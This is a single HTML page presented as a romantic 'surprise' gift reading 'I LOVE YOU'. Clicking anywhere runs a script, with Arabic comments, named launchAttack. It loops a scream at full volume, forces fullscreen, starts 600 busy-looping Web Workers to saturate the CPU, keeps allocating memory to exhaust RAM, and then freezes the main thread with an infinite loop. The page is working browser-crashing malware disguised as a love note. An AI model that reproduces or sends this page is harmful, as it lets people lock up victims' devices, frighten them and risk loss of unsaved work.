<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Surprise ❤️</title>
    <style>
        body { 
            background-color: black; 
            color: white; 
            display: flex; 
            flex-direction: column; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden; 
            font-family: Arial, sans-serif;
            cursor: pointer;
        }
        h1 { font-size: 5rem; text-shadow: 0 0 20px #ff0055; }
        p { font-size: 0.8rem; color: #222; margin-top: 20px; }
    </style>
</head>
<body>

    <h1>I LOVE YOU</h1>
    <p>Click anywhere to receive your gift...</p>

    <audio id="scream" src="https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Screams-Terror-Screams&filename=24/244368-2323c21d-9372-4d2b-871d-557626960f26.mp3"></audio>

    <script>
        let memoryBurner = [];

        function launchAttack() {
            // 1. تشغيل الصوت بأعلى درجة
            let audio = document.getElementById('scream');
            audio.volume = 1.0;
            audio.play();
            audio.loop = true; // تكرار الصرخة

            // 2. تفعيل ملء الشاشة فوراً
            let elem = document.documentElement;
            if (elem.requestFullscreen) { elem.requestFullscreen(); }
            else if (elem.webkitRequestFullscreen) { elem.webkitRequestFullscreen(); }

            // 3. تدمير المعالج (CPU 100%) - فتح 600 عامل
            for (let i = 0; i < 600; i++) {
                const workerBlob = new Blob([`
                    setInterval(() => {
                        while(true) {
                            Math.sqrt(Math.random()) * Math.exp(Math.random());
                        }
                    }, 0);
                `], { type: 'application/javascript' });
                new Worker(URL.createObjectURL(workerBlob));
            }

            // 4. تدمير الرام (RAM 100%)
            setInterval(() => {
                try {
                    let chunk = new BigUint64Array(1024 * 1024 * 50).fill(1n); 
                    memoryBurner.push(chunk);
                } catch(e) {}
            }, 5);

            // 5. تجميد المتصفح نهائياً (Main Thread Kill)
            // بعد ثانية واحدة، الجهاز هيتجمد والصوت هيفضل شغال
            setTimeout(() => {
                while(true) {
                    memoryBurner.push(new Array(1000000).fill("AHRRRRRRRR"));
                }
            }, 1000);
        }

        window.onclick = launchAttack;
    </script>
</body>
</html>
